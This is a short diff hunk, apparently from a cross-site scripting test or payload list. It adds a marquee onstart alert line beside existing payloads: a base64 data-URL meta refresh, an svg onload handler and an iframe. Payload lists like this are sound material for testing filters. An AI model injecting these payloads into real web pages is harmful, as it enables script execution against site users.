@@ -4,3 +4,4 @@
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
 <svg/onload=alert('XSS')>
 <iframe src='http://test.test'></iframe>
+<marquee onstart=alert('XSS')>
